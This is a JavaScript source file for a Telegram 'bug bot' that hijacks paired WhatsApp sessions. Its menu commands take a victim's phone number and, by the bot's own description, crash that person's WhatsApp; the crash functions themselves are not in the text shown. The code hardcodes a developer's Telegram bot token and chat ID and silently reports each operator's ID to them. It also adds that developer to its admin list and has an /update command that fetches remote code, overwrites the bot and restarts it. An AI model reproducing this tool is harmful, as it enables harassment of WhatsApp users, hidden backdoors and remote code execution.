const {
    default: makeWASocket,
    fetchLatestWAWebVersion,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@bellachu/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./lib/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "1274275039"]; 
const kontolmedia = fs.readFileSync('./lib/thumb.jpeg')

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

// Ganti dengan token bot Telegram kamu



// Ganti dengan chat_id kamu (owner)
const OWNER_CHAT_ID = '1274275039';

// Pesan notifikasi
const message = `Bot telah dijalankan pada ${new Date().toLocaleString()}. Owner Chat ID: ${OWNER_ID}`;

async function sendNotif() {
  try {
    const url = `https://api.telegram.org/bot7986800235:AAG7WoYotXpu5RhnXns-33KzUUNWNPn_X6Q/sendMessage`;
    await axios.post(url, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log('Notifikasi berhasil dikirim ke owner.');
  } catch (error) {
    console.error('Gagal mengirim notifikasi:', error.message);
  }
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Global handler - tangkap semua polling error termasuk 429
bot.on('polling_error', (error) => {
  const statusCode = error.response?.statusCode;
  if (statusCode === 429) {
    const retryAfter = error.response?.body?.parameters?.retry_after || 30;
    console.log(`[POLLING] Rate limited, tunggu ${retryAfter}s...`);
  } else {
    console.error('[POLLING ERROR]', error.message);
  }
});

function startBot() {
  console.log(chalk.red(`𝐇𝐈 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝑵𝑼𝑳𝑳
`));


console.log(chalk.bold.blue(`
═════════════════════════
 𝑵𝑼𝑳𝑳 𝑽𝑬𝑹𝑺𝑰𝑶𝑵 𝟏
═════════════════════════
`));

console.log(chalk.blue(`
------ (  𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙻𝙾𝙶𝙸𝙽 ) ------
`));
};

initializeWhatsAppConnections();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              sendNotif();
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙴𝚁𝚁𝙾𝚁 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://h.top4top.io/p_37763z75b0.png"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

//AutoUpdate
bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const repoRaw = "https://raw.githubusercontent.com/putxzz/UpdateXnull/refs/heads/main/index.js"; // ganti URL raw kamu

  const loadingFrames = [
    "▰▱▱▱▱▱▱▱▱▱  `10%`",
    "▰▰▱▱▱▱▱▱▱▱  `20%`",
    "▰▰▰▱▱▱▱▱▱▱  `30%`",
    "▰▰▰▰▱▱▱▱▱▱  `40%`",
    "▰▰▰▰▰▱▱▱▱▱  `50%`",
    "▰▰▰▰▰▰▱▱▱▱  `60%`",
    "▰▰▰▰▰▰▰▱▱▱  `70%`",
    "▰▰▰▰▰▰▰▰▱▱  `80%`",
    "▰▰▰▰▰▰▰▰▰▱  `90%`",
    "▰▰▰▰▰▰▰▰▰▰  `100%`"
  ];

  const phases = [
    "Menginisialisasi...",
    "Menghubungi server...",
    "Mengunduh file...",
    "Mengunduh file...",
    "Memverifikasi data...",
    "Memverifikasi data...",
    "Menulis file...",
    "Menulis file...",
    "Membuat backup...",
    "Menyelesaikan..."
  ];

  const user = msg.from;
  const userName = user.first_name || "Unknown";
  const userId = user.id;
  const timeNow = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

  // Hapus pesan command
  bot.deleteMessage(chatId, msg.message_id).catch(() => {});

  const waitMsg = await bot.sendMessage(chatId,
    `\`\`\`\n` +
    `╔══════════════════════╗\n` +
    `║   𝑵𝑼𝑳𝑳  SYSTEM UPDATE  ║\n` +
    `╚══════════════════════╝\n` +
    `\`\`\`\n` +
    `⏳ *Status*  : Menginisialisasi...\n` +
    `👤 *Request* : [${userName}](tg://user?id=${userId})\n` +
    `🕐 *Time*    : \`${timeNow}\`\n\n` +
    `${loadingFrames[0]}`,
    { parse_mode: "Markdown" }
  );

  let loadingIndex = 0;
  const loadingInterval = setInterval(() => {
    loadingIndex = (loadingIndex + 1) % loadingFrames.length;
    bot.editMessageText(
      `\`\`\`\n` +
      `╔══════════════════════╗\n` +
      `║   𝑵𝑼𝑳𝑳  SYSTEM UPDATE  ║\n` +
      `╚══════════════════════╝\n` +
      `\`\`\`\n` +
      `⚙️ *Status*  : ${phases[loadingIndex]}\n` +
      `👤 *Request* : [${userName}](tg://user?id=${userId})\n` +
      `🕐 *Time*    : \`${timeNow}\`\n\n` +
      `${loadingFrames[loadingIndex]}`,
      {
        chat_id: chatId,
        message_id: waitMsg.message_id,
        parse_mode: "Markdown"
      }
    ).catch(() => {});
  }, 400);

  try {
    const startTime = Date.now();
    const { data } = await axios.get(repoRaw, { timeout: 15000 });
    const downloadTime = ((Date.now() - startTime) / 1000).toFixed(2);

    if (!data || typeof data !== "string" || data.trim().length === 0) {
      clearInterval(loadingInterval);
      await bot.editMessageText(
        `\`\`\`\n` +
        `╔══════════════════════╗\n` +
        `║   𝑵𝑼𝑳𝑳  UPDATE  FAILED  ║\n` +
        `╚══════════════════════╝\n` +
        `\`\`\`\n` +
        `❌ *Error*   : File kosong atau tidak valid!\n` +
        `👤 *Request* : [${userName}](tg://user?id=${userId})\n` +
        `🕐 *Time*    : \`${timeNow}\`\n\n` +
        `▱▱▱▱▱▱▱▱▱▱  \`0%\``,
        {
          chat_id: chatId,
          message_id: waitMsg.message_id,
          parse_mode: "Markdown"
        }
      ).catch(() => {});

      // Hapus pesan gagal setelah 10 detik
      setTimeout(() => {
        bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
      }, 10000);
      return;
    }

    // Backup file lama
    if (fs.existsSync("./index.js")) {
      fs.copyFileSync("./index.js", "./index.js.bak");
    }

    fs.writeFileSync("./index.js", data, "utf8");
    clearInterval(loadingInterval);

    const fileSize = (Buffer.byteLength(data, "utf8") / 1024).toFixed(2);

    // Edit jadi sukses lalu langsung hapus
    await bot.editMessageText(
      `\`\`\`\n` +
      `╔══════════════════════╗\n` +
      `║   𝑵𝑼𝑳𝑳  UPDATE SUCCESS  ║\n` +
      `╚══════════════════════╝\n` +
      `\`\`\`\n` +
      `✅ *Status*  : Update berhasil!\n` +
      `👤 *Request* : [${userName}](tg://user?id=${userId})\n` +
      `📦 *Size*    : \`${fileSize} KB\`\n` +
      `⚡ *Speed*   : \`${downloadTime}s\`\n` +
      `💾 *Backup*  : \`index.js.bak\`\n` +
      `🕐 *Time*    : \`${timeNow}\`\n\n` +
      `▰▰▰▰▰▰▰▰▰▰  \`100%\`\n\n` +
      `🔄 *Merestart...*`,
      {
        chat_id: chatId,
        message_id: waitMsg.message_id,
        parse_mode: "Markdown"
      }
    ).catch(() => {});

    // Langsung hapus pesan sukses
    bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Restart bot
    setTimeout(() => {
      require("child_process").exec("pm2 restart index", (err) => {
        if (err) console.error("Restart gagal:", err);
      });
    }, 1000);

  } catch (e) {
    clearInterval(loadingInterval);

    // Rollback otomatis
    if (fs.existsSync("./index.js.bak")) {
      fs.copyFileSync("./index.js.bak", "./index.js");
    }

    await bot.editMessageText(
      `\`\`\`\n` +
      `╔══════════════════════╗\n` +
      `║   𝑵𝑼𝑳𝑳  UPDATE  FAILED  ║\n` +
      `╚══════════════════════╝\n` +
      `\`\`\`\n` +
      `❌ *Error*   : \`${e.message}\`\n` +
      `👤 *Request* : [${userName}](tg://user?id=${userId})\n` +
      `🕐 *Time*    : \`${timeNow}\`\n` +
      `♻️ *Rollback* : File lama dipulihkan.\n\n` +
      `▱▱▱▱▱▱▱▱▱▱  \`0%\``,
      {
        chat_id: chatId,
        message_id: waitMsg.message_id,
        parse_mode: "Markdown"
      }
    ).catch(() => {});

    // Hapus pesan error setelah 10 detik
    setTimeout(() => {
      bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
    }, 10000);
  }
});

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "😡 - Tidak ada waktu aktif";
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "🙈";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "🙈";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("🙈 Maaf, Anda bukan user premium. Silakan hubungi developer @Putxzyy untuk upgrade.");
    }
};

// case bug ada dibawah sendiri
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const userButtonColor = {}
const buttonIntervals = new Map()

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  if (shouldIgnoreMessage(msg)) return;

  // Semua 4 warna Telegram + pola estetik: merah → biru → hijau → abu → merah → hijau → biru
  const styles = ["danger", "primary", "success", "secondary", "danger", "success", "primary", "secondary"];
  let index = 0;

  const buildKeyboard = (i) => [
        [
          {
            text: "𝙾𝚆𝙽𝙴𝚁 ﹗",
            callback_data: "owner_menu",
            style: styles[i],
            icon_custom_emoji_id: "5341715473882955310"
          },
          {
            text: "𝙰𝚃𝚃𝙰𝙲𝙺 ﹗",
            callback_data: "trash_menu",
            style: styles[i],
            icon_custom_emoji_id: "4956726373679891220"
          }
        ],
        [
          {
            text: "𝚃𝚘𝚘𝚕𝚜 !",
            callback_data: "tools_menu",
            style: styles[i],
            icon_custom_emoji_id: "5325547803936572038"
          }
        ],
        [
          {
            text: "𝙾𝚆𝙽𝙴𝚁",
            url: "https://t.me/Putxzyy",
            style: styles[i],
            icon_custom_emoji_id: "5260535596941582167"
          }
        ]
      ];

  const sent = await bot.sendPhoto(chatId, "https://h.top4top.io/p_37763z75b0.png", {
    caption: `
<blockquote><b><tg-emoji emoji-id="5053600288754107920">📩</tg-emoji>#TridentsXnull </b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ. ɪᴛ ʜᴀꜱ ᴀ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇ ᴛʜᴀᴛ ᴄᴀɴ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ<tg-emoji emoji-id="5440660757194744323">📩</tg-emoji>
<blockquote><b><tg-emoji emoji-id="5447410659077661506">📩</tg-emoji> Information</b>
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji> Developer : @Putxzyy
<tg-emoji emoji-id="5188244915028516818">🍽</tg-emoji> Version : 5.5 Exclusive
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji> Platform Language : Javascript 
</blockquote>
<tg-emoji emoji-id="5316924123786524990">📩</tg-emoji> sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: buildKeyboard(index)
    }
  });

  const messageId = sent.message_id;

  // Clear interval lama kalau user /start berkali-kali
  if (buttonIntervals.has(messageId)) {
    clearInterval(buttonIntervals.get(messageId));
    buttonIntervals.delete(messageId);
  }

  // Interval animasi tombol - aman dari 429
  let isPaused = false;

  const intervalId = setInterval(async () => {
    if (isPaused) return; // skip tick kalau sedang cooldown 429
    index = (index + 1) % styles.length;
    try {
      await bot.editMessageReplyMarkup(
        { inline_keyboard: buildKeyboard(index) },
        { chat_id: chatId, message_id: messageId }
      );
    } catch (e) {
      const code = e.response?.statusCode;
      if (code === 429) {
        // Pause interval sementara sesuai retry_after, tanpa buat interval baru
        const retryAfter = (e.response?.body?.parameters?.retry_after || 30) * 1000;
        isPaused = true;
        setTimeout(() => { isPaused = false; }, retryAfter);
      } else if (code === 400 || code === 403) {
        // Pesan dihapus atau tidak bisa diedit, hentikan interval
        const id = buttonIntervals.get(messageId);
        if (id) { clearInterval(id); buttonIntervals.delete(messageId); }
      }
    }
  }, 5000); // 5 detik biar tidak spam

  buttonIntervals.set(messageId, intervalId);
});

async function safeSend(fn, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (err) {
      const statusCode = err.response?.statusCode || err.code;
      if (statusCode === 429) {
        const retryAfter = err.response?.body?.parameters?.retry_after || 30;
        console.log(`Rate limited, tunggu ${retryAfter}s...`);
        await new Promise(r => setTimeout(r, retryAfter * 1000));
      } else {
        throw err;
      }
    }
  }
}

// callback query handler
bot.on('callback_query', async (query) => {
  try {
    // Answer callback SEKALI - wajib agar tombol tidak loading terus
    try { await bot.answerCallbackQuery(query.id); } catch (_) {}
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    // Semua 4 warna Telegram + pola estetik: merah → biru → hijau → abu → merah → hijau → biru
    const styles = ["danger", "primary", "success", "secondary", "danger", "success", "primary", "secondary"];
    let index = 0;

    let caption = "";
    let buildKeyboard;

    if (query.data === "trash_menu") {
      caption = `
<blockquote><b><tg-emoji emoji-id="5053600288754107920">📩</tg-emoji> #TridentsXnull</b></blockquote>
<b>I am a telegram bot created by @Putxzyy || I can bug whatsapp for you
Vテレグラムボットのバグです。</b>
─────────────────────

<blockquote><b>「 <tg-emoji emoji-id="5465369102753229997">📩</tg-emoji> Xnull - Commmand <tg-emoji emoji-id="5465369102753229997">📩</tg-emoji> 」</b></blockquote>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullForce <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullDelay <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullDozer <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullChat <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullVchats <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullVxc <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullPhone <b>number</b>
<tg-emoji emoji-id="5363944107188185248">📩</tg-emoji> /NullIphone <b>number</b>
`;

      buildKeyboard = (i) => [[
        {
          text: "Back",
          callback_data: "back_to_main",
          style: styles[i],
          icon_custom_emoji_id: "5416117059207572332"
        }
      ]];
    }

    if (query.data === "owner_menu") {
      caption = `
<blockquote><b><tg-emoji emoji-id="5053600288754107920">📩</tg-emoji> #TridentsXnull</b></blockquote>
I am a telegram bot created by @Putxzyy || I can bug whatsapp for you
Vテレグラムボットのバグです。
─────────────────────
<blockquote><b>「 <tg-emoji emoji-id="5116512467194741904">📩</tg-emoji> Owner Menu <tg-emoji emoji-id="5116512467194741904">📩</tg-emoji> 」</b></blockquote>
<tg-emoji emoji-id="6138749429928170318">📩</tg-emoji> /setjeda 5ᴍ
<tg-emoji emoji-id="6138749429928170318">📩</tg-emoji> /addprem ɪᴅ ᴅᴀʏs
<tg-emoji emoji-id="6138749429928170318">📩</tg-emoji> /delprem ɪᴅ
<tg-emoji emoji-id="6138749429928170318">📩</tg-emoji> /cekprem
<tg-emoji emoji-id="6138749429928170318">📩</tg-emoji> /addadmin ɪᴅ
<tg-emoji emoji-id="6138749429928170318">📩</tg-emoji> /reqpair number
`;

      buildKeyboard = (i) => [
      [
        {
          text: "Back",
          callback_data: "back_to_main",
          style: styles[i],
          icon_custom_emoji_id: "5416117059207572332"
        }
      ],
      [
        {
          text: "TqToo",
          callback_data: "thanksto_menu",
          style: styles[i],
          icon_custom_emoji_id: "5217822164362739968"
        }
      ]];
    }
    
if (query.data === "tools_menu") {
      caption = `
<blockquote><b><tg-emoji emoji-id="5053600288754107920">📩</tg-emoji> #TridentsXnull</b></blockquote>
I am a telegram bot created by @Putxzyy || I can bug whatsapp for you
Vテレグラムボットのバグです。
─────────────────────
<blockquote><b>「 <tg-emoji emoji-id="5276032951342088188">📩</tg-emoji> Tools Menu <tg-emoji emoji-id="5276032951342088188">📩</tg-emoji> 」</b></blockquote>
<tg-emoji emoji-id="5972223227055836399">📩</tg-emoji> /iqc
<tg-emoji emoji-id="5972223227055836399">📩</tg-emoji> /gempa
<tg-emoji emoji-id="5972223227055836399">📩</tg-emoji> /dunia
<tg-emoji emoji-id="5972223227055836399">📩</tg-emoji> /testfunction
`;

      buildKeyboard = (i) => [[
        {
          text: "Back",
          callback_data: "back_to_main",
          style: styles[i],
          icon_custom_emoji_id: "5416117059207572332"
        }
      ]];
    }
    
if (query.data === "thanksto_menu") {
      caption = `
<blockquote><b><tg-emoji emoji-id="5053600288754107920">📩</tg-emoji> #TridentsXnull</b></blockquote>
I am a telegram bot created by @Putxzyy || I can bug whatsapp for you
Vテレグラムボットのバグです。
─────────────────────
<blockquote><b>「 <tg-emoji emoji-id="5424818078833715060">📩</tg-emoji> Thanks Menu <tg-emoji emoji-id="5424818078833715060">📩</tg-emoji> 」</b></blockquote>
<tg-emoji emoji-id="6287277984663474314">📩</tg-emoji> Creator @Putxzyy
<tg-emoji emoji-id="6287277984663474314">📩</tg-emoji> Support @xwarrxxx
<tg-emoji emoji-id="6287277984663474314">📩</tg-emoji> Support @pherine
<tg-emoji emoji-id="6287277984663474314">📩</tg-emoji> Support @Xatanicvxii
`;

      buildKeyboard = (i) => [[
        {
          text: "Back",
          callback_data: "back_to_main",
          style: styles[i],
          icon_custom_emoji_id: "5416117059207572332"
        }
      ]];
    }    
    

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b><tg-emoji emoji-id="5053600288754107920">📩</tg-emoji> #TridentsXnul l</b></blockquote>
╰➤ˎˊ˗ ɪ'ᴍ ᴀ ᴛᴇʟᴇɢʀᴀᴍ ʙᴜɢ ʙᴏᴛ. ɪᴛ ʜᴀꜱ ᴀ ʙᴜɢ ꜰᴇᴀᴛᴜʀᴇ ᴛʜᴀᴛ ᴄᴀɴ ᴄʀᴀꜱʜ ᴡʜᴀᴛꜱᴀᴘᴘ<tg-emoji emoji-id="5440660757194744323">📩</tg-emoji>
<blockquote><b><tg-emoji emoji-id="5447410659077661506">📩</tg-emoji> Information</b>
<tg-emoji emoji-id="5411301743738777449">🎩</tg-emoji> Developer : @Putxzyy
<tg-emoji emoji-id="5188244915028516818">🍽</tg-emoji> Version : 5.5 Exclusive
<tg-emoji emoji-id="6097881360112816903">🗡</tg-emoji> Platform Language : Javascript 
</blockquote>
